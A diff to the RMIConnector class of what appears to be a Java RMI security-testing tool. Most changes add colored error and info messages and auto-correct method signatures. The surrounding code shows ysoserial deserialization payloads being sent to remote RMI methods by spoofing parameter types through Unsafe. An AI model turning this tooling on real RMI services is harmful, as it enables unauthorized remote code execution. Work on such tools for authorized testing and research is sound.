@@ -33,6 +33,7 @@ public class RMIConnector {
 
     private static class Colors {
         public static String GREEN = "\033[92m";
+        public static String RED = "\033[91m";
         public static String ENDC = "\033[0m";
 
     }
@@ -103,9 +104,12 @@ public class RMIConnector {
                     if (e.detail instanceof ClassNotFoundException) {
                         interfaceName = e.detail.getMessage().split(" ")[0];
                     } else {
-                        System.err.println("Error retrieving remote interface className for name '" + regName + "'");
+                        System.err.println(Colors.RED + "[ERROR] Error retrieving remote interface className for name '" + regName + "'" + Colors.ENDC);
                         System.exit(1);
                     }
+                } catch (NotBoundException e) {
+                    System.err.println(Colors.RED + "[ERROR] Registry not bound on remote server: '" + regName + "'" + Colors.ENDC);
+                    System.exit(1);
                 }
 
                 String stubName = "DefaultStub";
@@ -166,13 +170,35 @@ public class RMIConnector {
 
                 // Simple method validation
                 if (!sig.matches("[\\w()<>,\\.\\[\\]\\s]+")) {
-                    System.err.println("Skipping, Invalid syntax: " + sig);
+                    System.err.println("[INFO] Skipping, Invalid syntax: " + sig);
                 }
+
+                boolean wasModified = false;
+
+                // Check for dummy params
+                if(!sig.matches(".*[\\w\\.\\$]+\\s+\\w+\\s*,.*")) {
+                    System.out.println("[INFO] Adding missing dummy parameter names to signature");
+                    sig = sig.replace(",", " a,");
+                    sig = sig.replace(")", " a)");
+                    wasModified = true;
+                }
+
+                if(sig.matches(".*\\.\\w+\\(.*")) {
+                    System.out.println("[INFO] Removing method FQDN");
+                    sig = sig.replaceFirst("[\\w\\.\\$]+\\.", "");
+                    wasModified = true;
+                }
+
+                if (wasModified) {
+                    System.out.println("[INFO] Auto-corrected signature: " + sig);
+                }
+
+
                 CtMethod newmethod = CtNewMethod.make(String.format("%s throws java.rmi.RemoteException;", sig), ctclass);
 
                 // Skip void args because they will always be executed
                 if (!allowUnsafe && newmethod.getParameterTypes().length == 0) {
-                    System.out.println("Skipping, void args: " + sig);
+                    System.out.println("[INFO] Skipping, void args: " + sig);
                     continue;
                 }
 
@@ -180,20 +206,20 @@ public class RMIConnector {
                     ctclass.addMethod(newmethod);
 
                 } catch (DuplicateMemberException e) {
-                    System.out.println("Duplicate prototype: " + newmethod);
+                    System.out.println("[INFO] Duplicate prototype: " + newmethod);
                 }
             }
 
             ctclass.toClass(customClassLoader);
         } catch (CannotCompileException ce ) {
             if (ce.getReason().contains(ctclass.getSimpleName())) {
-                System.err.println("\nError: Did you forget to remove the interface name from the method name?\n\nFull Stacktrace:\n");
+                System.err.println("\n" + Colors.RED + "[ERROR] Did you forget to remove the interface name from the method name?\n\nFull Stacktrace:\n" + Colors.ENDC);
             }
             else if (ce.getReason().contains(",") || ce.getReason().contains(") ")) {
-                System.err.println("\nError: Dummy parameter names are required for method signature.\n\nFull Stacktrace:\n");
+                System.err.println("\n" + Colors.RED + "[ERROR] Dummy parameter names are required for method signature (e.g., -s 'boolean login(java.lang.String a, java.lang.String b)') \n\nFull Stacktrace:\n" + Colors.ENDC);
             }
             else if (ce.getReason().contains("no such class")) {
-                System.err.println("\nError: Please provide fully-qualified name for this class.\n\nFull Stacktrace:\n");
+                System.err.println("\n" + Colors.RED + "[ERROR] Please provide fully-qualified name for this class.\n\nFull Stacktrace:\n" + Colors.ENDC);
             }
             ce.printStackTrace();
             System.exit(1);
@@ -241,17 +267,16 @@ public class RMIConnector {
             } else {
                 throw new IllegalArgumentException("Class does not implement ObjectPayload<Object>");
             }
-        } catch(ClassNotFoundException e) {
-            e.printStackTrace();
-        } catch (IllegalAccessException e) {
-            e.printStackTrace();
-        } catch (InstantiationException e) {
-            e.printStackTrace();
+        } catch (com.nqzero.permit.Permit.InitializationFailed e) {
+            System.err.println(Colors.RED + "[ERROR] ysoserial dependency does not work with JRE > 1.8" + Colors.ENDC);
+            System.exit(1);
         } catch (Exception e) {
             e.printStackTrace();
+            System.exit(1);
         }
+
         if(!execute(payload)) {
-            System.err.println("Payload was not invoked. Check the accuracy of the signature. Ex: \"boolean login(java.lang.String a, java.lang.String b)\"");
+            System.err.println(Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature. Ex: \"boolean login(java.lang.String a, java.lang.String b)\"" + Colors.ENDC);
         } else {
             System.out.println("Executed");
         }
@@ -326,7 +351,7 @@ public class RMIConnector {
                     if (me.getParameterTypes()[0].equals(((Class<?>[])unsafe.getObject(me,parameterTypesOffset))[0])) {
                         unsafe.putObject(me, parameterTypesOffset, fakeParameterTypes);
                     } else {
-                        System.err.println("JRE version not supported.");
+                        System.err.println(Colors.RED + "[ERROR] JRE version not supported." + Colors.ENDC);
                         System.exit(-1);
                     }
 
@@ -347,7 +372,7 @@ public class RMIConnector {
                 } catch (InvocationTargetException e) {
                     e.printStackTrace();
                 } catch (ConnectException e) {
-                    System.err.println("Failed to connect to remote");
+                    System.err.println(Colors.RED + "Failed to connect to remote" + Colors.ENDC);
                     System.exit(1);
                 } catch (ServerException e) {
                     if(e.getCause().getCause() instanceof ClassNotFoundException) {
